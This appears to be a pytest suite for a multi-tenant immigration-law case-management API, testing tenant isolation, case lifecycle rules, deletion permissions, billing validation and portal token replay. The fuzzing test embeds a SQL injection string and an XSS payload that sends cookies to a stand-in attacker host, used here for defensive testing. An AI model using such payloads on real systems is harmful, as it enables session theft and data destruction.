import uuid
from datetime import datetime, timezone, timedelta
import pytest

from backend.app.domain.case_lifecycle import (
    PreparationStatus,
    ReviewStatus,
    PaymentClearanceStatus,
    SubmissionAuthorizationStatus,
)
from backend.app.domain.models import ClientProfile, ImmigrationCase, Invoice
from backend.app.security.rbac import RoleCode


def test_tier5_cross_tenant_duplicate_detection_airtight_isolation(client, two_tenants):
    """
    Tier 5 Invariant: Duplicate client detection (/api/v1/clients/check-duplicates)
    must strictly query within the authenticated organization. Cross-tenant client records
    (even with identical email, phone, passport, or full name) must NEVER be discovered or leaked.
    """
    headers_a = two_tenants["tenant_a"]["headers"]
    headers_b = two_tenants["tenant_b"]["headers"]
    client_b = two_tenants["client_b"]

    # Tenant A attempts to check duplicates using Tenant B client's exact identifiers
    resp_leak_check = client.post(
        "/api/v1/clients/check-duplicates",
        headers=headers_a,
        json={
            "email": client_b.email,
            "phone": client_b.phone,
            "first_name": client_b.first_name,
            "last_name": client_b.last_name,
            "nationality": client_b.nationality,
        },
    )
    assert resp_leak_check.status_code == 200
    data = resp_leak_check.json()
    assert data["has_duplicates"] is False
    assert len(data["matches"]) == 0

    # Tenant B checking the exact same identifiers must find the match
    resp_legit_check = client.post(
        "/api/v1/clients/check-duplicates",
        headers=headers_b,
        json={
            "email": client_b.email,
            "phone": client_b.phone,
            "first_name": client_b.first_name,
            "last_name": client_b.last_name,
            "nationality": client_b.nationality,
        },
    )
    assert resp_legit_check.status_code == 200
    b_data = resp_legit_check.json()
    assert b_data["has_duplicates"] is True
    assert len(b_data["matches"]) >= 1
    assert any(str(client_b.id) == m["client_id"] for m in b_data["matches"])


def test_tier5_cross_tenant_mutation_and_destruction_rejection(client, two_tenants):
    """
    Tier 5 Invariant: Cross-tenant boundary mutation attempts on foreign resources
    (appointments, sponsors, holds, client deletion, preparation status) must be strictly rejected
    with 403 Forbidden or 404 Not Found.
    """
    worker_a_headers = two_tenants["worker_a"]["headers"]
    case_b_id = str(two_tenants["case_b"].id)
    client_b_id = str(two_tenants["client_b"].id)

    # 1. Tenant A caseworker attempts to create an appointment on Tenant B's case
    resp_appt = client.post(
        f"/api/v1/cases/{case_b_id}/appointments",
        headers=worker_a_headers,
        json={
            "vac_center": "Toronto VAC",
            "consular_post": "US Consulate General Toronto",
            "appointment_status": "scheduled",
        },
    )
    assert resp_appt.status_code in (403, 404)

    # 2. Tenant A caseworker attempts to add a financial sponsor to Tenant B's case
    resp_sponsor = client.post(
        f"/api/v1/cases/{case_b_id}/sponsors",
        headers=worker_a_headers,
        json={
            "name": "Hostile Cross-Tenant Sponsor",
            "relationship": "Employer",
            "loan_sanction_amount": 50000.0,
        },
    )
    assert resp_sponsor.status_code in (403, 404)

    # 3. Tenant A caseworker attempts to apply a lifecycle hold to Tenant B's case
    resp_hold = client.post(
        f"/api/v1/cases/{case_b_id}/lifecycle/hold",
        headers=worker_a_headers,
        json={
            "hold_type": "client_request",
            "reason": "Hostile hold injection attempt",
        },
    )
    assert resp_hold.status_code in (403, 404)

    # 4. Tenant A caseworker attempts to advance preparation status on Tenant B's case
    resp_prep = client.post(
        f"/api/v1/cases/{case_b_id}/lifecycle/preparation",
        headers=worker_a_headers,
        json={
            "target_status": "AUTHORIZED_FOR_PREPARATION",
            "notes": "Hostile status advance",
        },
    )
    assert resp_prep.status_code in (403, 404)

    # 5. Tenant A caseworker attempts to delete Tenant B's client profile
    resp_del_client = client.delete(
        f"/api/v1/clients/{client_b_id}",
        headers=worker_a_headers,
    )
    assert resp_del_client.status_code in (403, 404)


def test_tier5_case_lifecycle_submission_financial_and_review_gates(client, two_tenants):
    """
    Tier 5 Invariant: Submission authorization strictly requires preparation status READY_TO_SUBMIT,
    lawyer review APPROVED, and payment clearance PAID.
    Attempting to APPROVE submission when prerequisites are unmet must be rejected with 400/422.
    However, administrative hold actions (HOLD_ACCOUNTS, HOLD_COUNSELLOR) succeed and update state.
    """
    headers = two_tenants["tenant_a"]["headers"]
    case_a_id = str(two_tenants["case_a"].id)

    # 1. Attempt to APPROVE submission authorization while case is in intake (unpaid, unreviewed) -> Must FAIL
    resp_premature_approval = client.post(
        f"/api/v1/cases/{case_a_id}/submission-authorization",
        headers=headers,
        json={"action": "APPROVE", "notes": "Premature unverified approval"},
    )
    assert resp_premature_approval.status_code in (400, 422)
    err_body = resp_premature_approval.json()
    assert "error" in err_body or "detail" in err_body

    # 2. Apply a submission hold for accounting/arrears: action="HOLD_ACCOUNTS" -> Must Succeed
    resp_hold_accounts = client.post(
        f"/api/v1/cases/{case_a_id}/submission-authorization",
        headers=headers,
        json={"action": "HOLD_ACCOUNTS", "notes": "Retainer balance outstanding"},
    )
    assert resp_hold_accounts.status_code == 200
    assert resp_hold_accounts.json().get("submission_authorization_status") == "HELD_FOR_ACCOUNTS"

    # 3. Apply a submission hold for counselling/advising: action="HOLD_COUNSELLOR" -> Must Succeed
    resp_hold_counsel = client.post(
        f"/api/v1/cases/{case_a_id}/submission-authorization",
        headers=headers,
        json={"action": "HOLD_COUNSELLOR", "notes": "Advising interview scheduled"},
    )
    assert resp_hold_counsel.status_code == 200
    assert resp_hold_counsel.json().get("submission_authorization_status") == "HELD_FOR_COUNSELLOR"

    # 4. Reject authorization: action="REJECT" -> Updates to UNAUTHORIZED
    resp_reject = client.post(
        f"/api/v1/cases/{case_a_id}/submission-authorization",
        headers=headers,
        json={"action": "REJECT", "notes": "Deficient documentation"},
    )
    assert resp_reject.status_code == 200
    assert resp_reject.json().get("submission_authorization_status") == "UNAUTHORIZED"


def test_tier5_case_hold_statutory_milestone_and_deadline_preservation(client, two_tenants):
    """
    Tier 5 Invariant: Placing a case ON_HOLD must freeze operational progression without erasing,
    pausing, or mutating statutory deadlines, milestones, or scheduled tasks.
    Releasing hold restores ACTIVE operational state with a clean audit history.
    """
    headers = two_tenants["tenant_a"]["headers"]
    case_a_id = str(two_tenants["case_a"].id)
    target_date = (datetime.now(timezone.utc) + timedelta(days=45)).isoformat()

    # 1. Create a statutory milestone
    resp_milestone = client.post(
        f"/api/v1/cases/{case_a_id}/milestones",
        headers=headers,
        json={
            "title": "USCIS RFE Statutory Deadline",
            "stage": "intake",
            "target_date": target_date,
        },
    )
    assert resp_milestone.status_code == 201
    milestone_id = resp_milestone.json()["id"]

    # 2. Create an operational task
    resp_task = client.post(
        f"/api/v1/cases/{case_a_id}/tasks",
        headers=headers,
        json={
            "title": "Compile Academic Expert Opinion Letters",
            "priority": "high",
            "due_date": target_date,
        },
    )
    assert resp_task.status_code == 201
    task_id = resp_task.json()["id"]

    # 3. Apply case hold
    resp_apply_hold = client.post(
        f"/api/v1/cases/{case_a_id}/lifecycle/hold",
        headers=headers,
        json={
            "hold_type": "client_request",
            "reason": "Client overseas on emergency leave",
        },
    )
    assert resp_apply_hold.status_code == 200
    assert resp_apply_hold.json().get("operational_state") == "ON_HOLD"

    # 4. Verify milestones and tasks are 100% intact and uncorrupted
    resp_get_milestones = client.get(f"/api/v1/cases/{case_a_id}/milestones", headers=headers)
    assert resp_get_milestones.status_code == 200
    milestones = resp_get_milestones.json()
    assert any(m["id"] == milestone_id and m["title"] == "USCIS RFE Statutory Deadline" for m in milestones)

    resp_get_tasks = client.get(f"/api/v1/cases/{case_a_id}/tasks", headers=headers)
    assert resp_get_tasks.status_code == 200
    tasks = resp_get_tasks.json()
    assert any(t["id"] == task_id for t in tasks)

    # 5. Check hold history has active unreleased record
    resp_holds = client.get(f"/api/v1/cases/{case_a_id}/lifecycle/holds", headers=headers)
    assert resp_holds.status_code == 200
    active_holds = resp_holds.json()
    assert len(active_holds) >= 1
    assert active_holds[0]["released_at"] is None

    # 6. Release hold
    resp_release_hold = client.post(
        f"/api/v1/cases/{case_a_id}/lifecycle/release-hold",
        headers=headers,
        json={"resolution_notes": "Client returned to country and resumed engagement"},
    )
    assert resp_release_hold.status_code == 200
    assert resp_release_hold.json().get("operational_state") == "ACTIVE"

    # 7. Check hold history record now marked released
    resp_holds_after = client.get(f"/api/v1/cases/{case_a_id}/lifecycle/holds", headers=headers)
    assert resp_holds_after.status_code == 200
    assert resp_holds_after.json()[0]["released_at"] is not None


def test_tier5_case_fsm_close_reopen_and_timeline_integrity(client, two_tenants):
    """
    Tier 5 Invariant: Full case closure, reopening, and archiving lifecycle transitions
    must maintain audit timeline events and prevent unauthorized stage jumps.
    """
    headers = two_tenants["tenant_a"]["headers"]
    case_a_id = str(two_tenants["case_a"].id)

    # 1. Close active case
    resp_close = client.post(
        f"/api/v1/cases/{case_a_id}/close",
        headers=headers,
        json={"reason": "Matter successfully concluded with permanent residency visa issuance"},
    )
    assert resp_close.status_code == 200
    assert resp_close.json().get("status") == "closed"

    # 2. Reopen case
    resp_reopen = client.post(
        f"/api/v1/cases/{case_a_id}/reopen",
        headers=headers,
        json={"reason": "Client requested dependent extension filing"},
    )
    assert resp_reopen.status_code == 200
    assert resp_reopen.json().get("status") in ("reopened", "intake", "processing")

    # 3. Direct transition from 'reopened' to 'archived' MUST BE REJECTED by FSM
    resp_invalid_archive = client.post(
        f"/api/v1/cases/{case_a_id}/archive",
        headers=headers,
        json={"reason": "Premature archive attempt"},
    )
    assert resp_invalid_archive.status_code == 400
    assert "Invalid case workflow transition" in resp_invalid_archive.json().get("message", "")

    # 4. Valid FSM progression: Close the reopened case first, then archive
    resp_reclose = client.post(
        f"/api/v1/cases/{case_a_id}/close",
        headers=headers,
        json={"reason": "Extension matter concluded"},
    )
    assert resp_reclose.status_code == 200
    assert resp_reclose.json().get("status") == "closed"

    resp_archive = client.post(
        f"/api/v1/cases/{case_a_id}/archive",
        headers=headers,
        json={"reason": "7-year statutory document retention compliance archive"},
    )
    assert resp_archive.status_code == 200
    assert resp_archive.json().get("status") == "archived"

    # 5. Verify timeline event log integrity
    resp_history = client.get(f"/api/v1/cases/{case_a_id}/history", headers=headers)
    assert resp_history.status_code == 200
    events = resp_history.json()
    assert len(events) >= 2


def test_tier5_retained_client_deletion_rbac_and_conflict_safeguards(client, two_tenants, auth_factory):
    """
    Tier 5 Invariant: Client profile deletion has strict RBAC and relational integrity safeguards:
    - Retained client persona -> 403 Forbidden
    - Paralegal / Case Worker persona -> 403 Forbidden
    - Owner attempting to delete a client with active linked cases -> 409 Conflict
    - Owner deleting an unlinked client (0 cases) -> 200 OK
    """
    tenant_a = two_tenants["tenant_a"]
    owner_headers = tenant_a["headers"]
    worker_headers = two_tenants["worker_a"]["headers"]
    client_a_id = str(two_tenants["client_a"].id)

    # 1. Provision a Retained Client persona in Tenant A
    client_persona = auth_factory(
        email="client-applicant-attacker@apex-immigration.com",
        role_code=RoleCode.RETAINED_CLIENT,
        existing_org=tenant_a["org"],
        full_name="Attacker Client",
    )

    # Retained client attempts to delete client_a -> 403 Forbidden
    resp_client_del = client.delete(
        f"/api/v1/clients/{client_a_id}",
        headers=client_persona["headers"],
    )
    assert resp_client_del.status_code == 403

    # 2. Paralegal / Caseworker attempts to delete client_a -> 403 Forbidden
    resp_worker_del = client.delete(
        f"/api/v1/clients/{client_a_id}",
        headers=worker_headers,
    )
    assert resp_worker_del.status_code == 403

    # 3. Owner attempts to delete client_a who has linked case CASE-APEX-001 -> 409 Conflict
    resp_conflict_del = client.delete(
        f"/api/v1/clients/{client_a_id}",
        headers=owner_headers,
    )
    assert resp_conflict_del.status_code == 409
    assert "Cannot delete client" in resp_conflict_del.json().get("message", "") or "associated case" in resp_conflict_del.json().get("detail", "")

    # 4. Create an unlinked standalone client (0 cases)
    resp_new_client = client.post(
        "/api/v1/clients",
        headers=owner_headers,
        json={
            "first_name": "Temporary",
            "last_name": "Applicant",
            "email": "temp-applicant@example.com",
            "nationality": "GBR",
        },
    )
    assert resp_new_client.status_code == 201
    temp_client_id = resp_new_client.json()["id"]

    # 5. Owner deletes unlinked client -> 200 OK
    resp_success_del = client.delete(
        f"/api/v1/clients/{temp_client_id}",
        headers=owner_headers,
    )
    assert resp_success_del.status_code == 200

    # Confirm client profile is gone
    resp_verify_gone = client.get(f"/api/v1/clients/{temp_client_id}", headers=owner_headers)
    assert resp_verify_gone.status_code == 404


def test_tier5_reapplication_lineage_and_clean_slate_isolation(client, two_tenants):
    """
    Tier 5 Invariant: Case reapplication creates a fresh child case with CLEARANCE_PENDING status,
    linked to the same client, while maintaining parent case integrity.
    """
    headers = two_tenants["tenant_a"]["headers"]
    case_a_id = str(two_tenants["case_a"].id)

    resp_reapply = client.post(
        f"/api/v1/cases/{case_a_id}/lifecycle/reapply",
        headers=headers,
        json={
            "new_case_number": "CASE-APEX-001-REAPPLICATION",
            "reason": "Statutory policy revision reopened pathway eligibility",
            "title": "John Doe Express Entry PR (Reapplication)",
        },
    )
    assert resp_reapply.status_code == 200
    new_case = resp_reapply.json()
    assert new_case["case_number"] == "CASE-APEX-001-REAPPLICATION"
    assert new_case["client_id"] == str(two_tenants["client_a"].id)
    assert new_case["status"] in ("intake", "inquiry")

    # Verify original case remains intact
    resp_orig = client.get(f"/api/v1/cases/{case_a_id}", headers=headers)
    assert resp_orig.status_code == 200
    assert resp_orig.json()["case_number"] == "CASE-APEX-001"


def test_tier5_adversarial_payload_fuzzing_unicode_and_injection_immunity(client, two_tenants):
    """
    Tier 5 Invariant: Application handles adversarial inputs without SQL injection,
    HTML execution crashes, or encoding corruption:
    - 10,000+ characters of content
    - SQL injection: '; DROP TABLE users; --
    - XSS / HTML payloads: <script>alert(1)</script>
    - Deep Unicode, Emojis, and Bidirectional Arabic/Hebrew text
    """
    headers = two_tenants["tenant_a"]["headers"]
    case_a_id = str(two_tenants["case_a"].id)

    adversarial_content = (
        "SQL: '; DROP TABLE users; SELECT * FROM audit_events WHERE '1'='1'; -- \n"
        "XSS: <script>document.location='http://attacker.com/steal?c='+document.cookie</script><img src=x onerror=alert(1)>\n"
        "UNICODE: العربية / עברית / 日本語 / हिन्दी / 🚀🛡️⚖️\n"
        + ("A" * 10000)
    )

    resp_note = client.post(
        f"/api/v1/cases/{case_a_id}/notes",
        headers=headers,
        json={
            "note_type": "internal",
            "content": adversarial_content,
            "is_client_visible": False,
        },
    )
    assert resp_note.status_code == 201
    note_id = resp_note.json()["id"]

    # Retrieve and verify exact string fidelity without unhandled crash or database truncation
    resp_get_notes = client.get(f"/api/v1/cases/{case_a_id}/notes", headers=headers)
    assert resp_get_notes.status_code == 200
    notes = resp_get_notes.json()
    saved_note = next(n for n in notes if n["id"] == note_id)
    assert saved_note["content"] == adversarial_content
    assert "<script>" in saved_note["content"]


def test_tier5_billing_invoicing_payment_and_cross_tenant_isolation(client, two_tenants):
    """
    Tier 5 Invariant: Billing invoice lifecycle (generation, mathematical total balance calculation,
    payment recording) enforces strict organization isolation and rejects negative/zero amounts.
    """
    headers_a = two_tenants["tenant_a"]["headers"]
    headers_b = two_tenants["tenant_b"]["headers"]
    client_a_id = str(two_tenants["client_a"].id)

    # 1. Tenant A generates invoice for client_a
    resp_inv = client.post(
        "/api/v1/billing/invoices",
        headers=headers_a,
        json={
            "client_id": client_a_id,
            "currency": "USD",
            "line_items": [
                {
                    "description": "Form I-140 Legal Drafting",
                    "quantity": 1.0,
                    "unit_price": 4500.0,
                    "line_type": "service_fee",
                },
                {
                    "description": "USCIS Statutory Filing Fee (OAC)",
                    "quantity": 1.0,
                    "unit_price": 700.0,
                    "line_type": "government_fee",
                },
            ],
            "discount_amount": 200.0,
        },
    )
    assert resp_inv.status_code == 201
    inv_data = resp_inv.json()
    invoice_id = inv_data["id"]
    # 4500 + 700 - 200 = 5000.0
    assert inv_data["subtotal"] == 5200.0
    assert inv_data["balance_due"] == 5000.0

    # 2. Tenant B attempts to read Tenant A's invoice -> 404 Not Found
    resp_b_spy = client.get(f"/api/v1/billing/invoices/{invoice_id}", headers=headers_b)
    assert resp_b_spy.status_code == 404

    # 3. Negative payment attempt -> 422 Unprocessable Entity
    resp_neg_pay = client.post(
        f"/api/v1/billing/invoices/{invoice_id}/payments",
        headers=headers_a,
        json={"amount": -500.0, "currency": "USD"},
    )
    assert resp_neg_pay.status_code == 422

    # 4. Zero payment attempt -> 422 Unprocessable Entity
    resp_zero_pay = client.post(
        f"/api/v1/billing/invoices/{invoice_id}/payments",
        headers=headers_a,
        json={"amount": 0.0, "currency": "USD"},
    )
    assert resp_zero_pay.status_code == 422

    # 5. Legitimate payment recording -> 201 Created
    resp_pay = client.post(
        f"/api/v1/billing/invoices/{invoice_id}/payments",
        headers=headers_a,
        json={
            "amount": 2500.0,
            "currency": "USD",
            "payment_method": "credit_card_tokenized",
            "card_last4": "4242",
        },
    )
    assert resp_pay.status_code == 201
    pay_data = resp_pay.json()
    assert pay_data["amount"] == 2500.0
    assert pay_data["balance_due"] == 2500.0

    # 6. Tenant B attempts to record a payment against Tenant A's invoice -> 404 Not Found
    resp_b_pay = client.post(
        f"/api/v1/billing/invoices/{invoice_id}/payments",
        headers=headers_b,
        json={"amount": 100.0, "currency": "USD"},
    )
    assert resp_b_pay.status_code == 404


def test_tier5_portal_activation_token_single_use_security_invariant(client, two_tenants):
    """
    Tier 5 Invariant: Portal invitation tokens are single-use only.
    Replay attacks attempting to re-activate an account with an already accepted token
    must be rejected with 400 or 404.
    """
    headers = two_tenants["tenant_a"]["headers"]
    case_a_id = str(two_tenants["case_a"].id)
    invite_email = f"portal-applicant-{uuid.uuid4().hex[:6]}@example.com"

    # 1. Issue invitation token
    resp_invite = client.post(
        "/api/v1/portal/invite",
        headers=headers,
        json={
            "case_id": case_a_id,
            "email": invite_email,
            "full_name": "Portal Candidate",
        },
    )
    assert resp_invite.status_code == 201
    invite_token = resp_invite.json()["invitation_token"]

    # 2. First activation -> 200 OK
    resp_act1 = client.post(
        "/api/v1/portal/activate",
        json={
            "invitation_token": invite_token,
            "password": "StrongSecretPassword123!",
            "agreed_to_privacy": True,
        },
    )
    assert resp_act1.status_code == 200
    assert resp_act1.json().get("status") in ("ok", "success")

    # 3. Replay attack: Re-submit the exact same token -> Must FAIL (401 Unauthorized, 400, or 404)
    resp_act2 = client.post(
        "/api/v1/portal/activate",
        json={
            "invitation_token": invite_token,
            "password": "SecondPassword456!",
            "agreed_to_privacy": True,
        },
    )
    assert resp_act2.status_code in (401, 400, 404)
